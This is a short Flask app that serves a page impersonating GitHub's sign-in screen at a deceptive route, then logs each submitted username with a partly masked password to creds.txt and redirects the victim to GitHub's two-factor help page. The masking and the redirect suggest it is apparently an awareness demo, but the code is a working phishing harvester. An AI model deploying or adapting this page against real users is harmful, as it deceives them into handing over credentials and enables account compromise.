from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route("/auth_redirect=github.com")
def login():
    return render_template("Sign in to GitHub.html")


@app.route("/authorization", methods=["POST"])
def authorization():
    with open("creds.txt", "a") as file:
        file.write(
            request.form["login"]
            + " "
            + request.form["password"][0:3]
            + "****"
            + request.form["password"][-1]
            + "\n"
        )
    return redirect(
        "https://help.github.com/en/articles/securing-your-account-with-two-factor-authentication-2fa"
    )

